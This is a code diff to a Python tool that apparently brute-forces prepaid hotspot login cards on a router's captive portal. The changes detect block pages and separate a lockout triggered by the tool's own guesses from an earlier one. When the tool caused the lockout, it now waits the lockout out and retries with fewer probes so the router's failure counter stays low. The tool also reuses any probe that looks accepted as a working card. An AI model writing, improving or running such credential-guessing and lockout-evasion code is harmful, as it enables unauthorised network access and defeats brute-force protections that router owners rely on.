@@ -153,7 +153,8 @@ def bench_cards(p: dict, count: int = 3, seed: int = 0) -> list:
 
 
 def calibrate(profile: dict, known_card: str = "", keyword: str = "",
-              learn_known: bool = True, log=None, checks=None) -> Calibration:
+              learn_known: bool = True, log=None, checks=None,
+              probes: int = 3) -> Calibration:
     p = store.migrate(profile)
     cal = Calibration()
     cal.profile = p
@@ -194,6 +195,18 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                  {"status": resp.status, "ms": round(ms),
                   "final_url": p["login_url"]})
 
+        # --- 1b. is the door already shut? --------------------------------
+        # If the login page itself is a block page, sending the test cards
+        # would only add failures to a counter that is already full - and on a
+        # router that locks after two of them, it makes things worse.
+        page_word = find_phrase((resp.text or "").lower(), config.BAN_WORDS)
+        if resp.status in (403, 429) or page_word:
+            cal.error = "blocked_already"
+            cal.step("reach_login_page", False, "blocked_before_probes",
+                     {"status": resp.status, "word": page_word,
+                      "advice": "reconnect_or_restart_router"})
+            return cal
+
         # --- 2. is the guest online, walled or offline? -----------------
         cal.internet = verify.probe_internet(session, checks=checks)
         state = cal.internet["state"]
@@ -206,8 +219,8 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                  {k: v for k, v in cal.internet.items() if k != "state"})
 
         # --- 3. learn what a WRONG card looks like ----------------------
-        probes, replies = [], []
-        for card in bench_cards(p, 3):
+        probe_cards, replies = [], []
+        for card in bench_cards(p, max(2, min(int(probes or 2), 4))):
             try:
                 r = send_login(session, p, card)
             except Exception as exc:                    # noqa: BLE001
@@ -215,7 +228,7 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                 cal.step("rejection_probe", False, f"net_{err.kind}",
                          {"card_hint": card[:4] + "...", "text": err.text[:160]})
                 return cal
-            probes.append(card)
+            probe_cards.append(card)
             replies.append(r)
 
         if not replies:
@@ -236,10 +249,15 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
             if block_word:
                 break
         if block_status or block_word:
+            # The login page was fine a moment ago and the router locked us
+            # after the test cards: that is OUR lockout (it usually expires),
+            # not a router that refuses this device since before.
             cal.error = "blocked_already"
-            cal.step("rejection_baseline", False, "blocked_already",
-                     {"advice": "restart_router_or_reconnect",
-                      "status": block_status[:3], "word": block_word})
+            cal.step("rejection_baseline", False, "blocked_by_our_probes",
+                     {"advice": "wait_then_retry_with_fewer_probes",
+                      "status": block_status[:3], "word": block_word,
+                      "probes_sent": len(replies),
+                      "wait_seconds": config.BLOCK_WAIT_SECONDS})
             return cal
 
         fp = Fingerprinter.learn(replies, login_reply=resp)
@@ -249,13 +267,13 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                   "samples": fp.samples,
                   "masked_values": len(fp.literals),
                   "status": fp.reject_status, "length": fp.reject_len,
-                  "sample_cards": [c[:6] + "..." for c in probes],
+                  "sample_cards": [c[:6] + "..." for c in probe_cards],
                   "note": fp.note})
 
         # A probe that already looks accepted is a free known-good card.
         if not known_card:
             probe_judge = Judge(fp, p["login_url"], keyword and [keyword] or [])
-            for i, (card, r) in enumerate(zip(probes, replies)):
+            for i, (card, r) in enumerate(zip(probe_cards, replies)):
                 v = probe_judge.classify(r, submitted_values(p, card))
                 if v.is_hit:
                     known_card = card
@@ -382,6 +400,18 @@ CALIBRATION_RETRYABLE = ("stale", "reset", "read_timeout", "connect_timeout",
 
 def calibration_retryable(error: str) -> bool:
     return (error or "") in CALIBRATION_RETRYABLE
+
+
+def block_caused_by_probes(cal) -> bool:
+    """True when the router locked us *because of* our test cards.
+
+    A block page that was already there needs a new IP or a router restart;
+    one we caused ourselves usually expires on its own.
+    """
+    if (cal.error or "") != "blocked_already":
+        return False
+    return not any(s.get("reason") == "blocked_before_probes"
+                   for s in cal.steps)
 
 
 # ---------------------------------------------------------------------------
@@ -608,6 +638,17 @@ class Engine:
             self.stop_reason = reason
         self.stop_event.set()
 
+    def _wait(self, seconds: float) -> bool:
+        """Sleep in small steps and wake up the moment the user stops the run.
+
+        Returns False when the run was stopped while waiting.
+        """
+        end = time.time() + max(0.0, float(seconds or 0))
+        while time.time() < end:
+            if self.stop_event.wait(0.4):
+                return False
+        return True
+
     def start(self, profile: dict, attempts: int, threads: int, delay_ms: int = 0,
               keyword: str = "", known_card: str = "", verify_after: bool = True,
               auto_stop: bool = True, resume: bool = True) -> dict:
@@ -668,14 +709,34 @@ class Engine:
     def _run(self, p, attempts, threads, delay_ms, keyword, known_card) -> None:
         try:
             cal = calibrate(p, known_card=known_card, keyword=keyword,
-                            checks=self.checks)
+                            checks=self.checks,
+                            probes=config.CALIBRATION_PROBES)
             if not cal.ok and calibration_retryable(cal.error):
                 # one hiccup must not cost the user the whole run
                 self.emit("note", {"message": "retrying_learning",
                                    "after": cal.error})
                 time.sleep(1.0)
                 cal = calibrate(p, known_card=known_card, keyword=keyword,
-                                checks=self.checks)
+                                checks=self.checks,
+                                probes=config.CALIBRATION_PROBES)
+            if not cal.ok and block_caused_by_probes(cal):
+                # Our own test cards filled the router's failure counter.  The
+                # lockout is usually temporary: wait it out, then try again
+                # with fewer cards so we do not refill it.
+                self.emit("block_wait",
+                          {"seconds": config.BLOCK_WAIT_SECONDS,
+                           "cause": "our_test_cards"})
+                self._wait(config.BLOCK_WAIT_SECONDS)
+                if self.stop_event.is_set():
+                    self.state, self.error = "done", "user_stop"
+                    self.stop_reason = "user_stop"
+                    self.finished_at = time.time()
+                    self.emit("state", {"state": "done",
+                                        "stop_reason": self.stop_reason})
+                    return
+                cal = calibrate(p, known_card=known_card, keyword=keyword,
+                                checks=self.checks,
+                                probes=config.CALIBRATION_PROBES_RETRY)
             self.calibration = cal.as_dict()
             self.emit("calibration", self.calibration)
             if not cal.ok:
